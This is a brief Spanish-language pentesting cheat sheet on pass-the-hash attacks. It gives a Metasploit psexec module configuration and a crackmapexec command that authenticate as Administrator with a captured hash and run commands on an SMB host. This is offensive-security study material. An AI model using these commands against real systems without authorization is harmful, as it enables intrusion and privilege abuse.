# ¿Qué es?

Es una técnica de escalada de privilegios que consiste en capturar hashes de usuarios y utilizarlos para autenticarse en el sistema como dicho usuario.

# Explotación

## Metasploit PsExec module

Con el módulo PsExec de [[metasploit]] podemos llevar a cabo este ataque:

```bash
use exploit/windows/smb/psexec

set rhosts
set lport

set smbuser Administrator
set smbpass <pass/hash>

set target --Sin esta puede que no funcione
```

## Crackmapexec

```bash
crackmapexec smb 10.2.28.132 -u Administrator -H "<Hash>" -x "<command>"
```